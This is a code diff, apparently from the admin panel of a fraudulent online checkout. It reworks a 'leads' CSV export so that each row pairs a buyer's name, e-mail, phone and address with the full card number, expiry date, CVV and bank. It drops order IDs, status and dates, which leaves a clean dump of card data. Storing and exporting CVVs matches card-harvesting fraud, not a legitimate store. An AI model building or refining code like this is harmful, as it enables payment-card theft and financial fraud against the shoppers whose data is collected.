@@ -307,8 +307,10 @@ export default function LeadsPanelPage() {
   }
 
   function handleExportCsv() {
+    // CSV organizado linha por linha (1 pedido = 1 linha), em dois blocos:
+    // dados pessoais e dados de pagamento informados no checkout.
     const headers = [
-      "Pedido",
+      // Dados pessoais
       "Nome",
       "E-mail",
       "Telefone",
@@ -320,22 +322,16 @@ export default function LeadsPanelPage() {
       "Bairro",
       "Cidade",
       "UF",
-      "Status",
+      // Dados de pagamento
       "Forma de Pagamento",
       "Parcelas",
       "Numero do Cartao",
       "Validade",
       "CVV",
       "Banco / Instituicao",
-      "IP",
-      "Subtotal",
-      "Desconto",
       "Total",
-      "Observacoes",
-      "Data",
     ];
     const rows = filteredLeads.map((lead) => {
-      const status = resolveOrderStatus(lead.createdAt, lead.manualStatus, lead.paymentMethod);
       const isPix = lead.paymentMethod?.toUpperCase() === "PIX";
       // Número completo do cartão, agrupado em blocos de 4 quando possível
       const digits = lead.cardNumber?.replace(/\D/g, "") ?? "";
@@ -345,7 +341,7 @@ export default function LeadsPanelPage() {
           ? digits.replace(/(\d{4})(?=\d)/g, "$1 ")
           : digits || "-";
       return [
-        lead.id.slice(-6).toUpperCase(),
+        // Dados pessoais
         lead.fullName,
         lead.email,
         lead.phone,
@@ -357,19 +353,14 @@ export default function LeadsPanelPage() {
         lead.neighborhood,
         lead.city,
         lead.state,
-        ORDER_STATUS_LABEL[status],
+        // Dados de pagamento
         isPix ? "PIX (WhatsApp)" : "Cartão",
         isPix ? "-" : lead.installments,
         cartao,
         isPix ? "-" : lead.cardExpiry || "-",
         isPix ? "-" : lead.cardCvv || "-",
         lead.cardBank ?? "-",
-        lead.ip ?? "-",
-        (lead.subtotalCents / 100).toFixed(2).replace(".", ","),
-        (lead.discountCents / 100).toFixed(2).replace(".", ","),
         (lead.totalCents / 100).toFixed(2).replace(".", ","),
-        lead.notes ?? "-",
-        new Date(lead.createdAt).toLocaleString("pt-BR"),
       ];
     });
     const csv = [headers, ...rows]
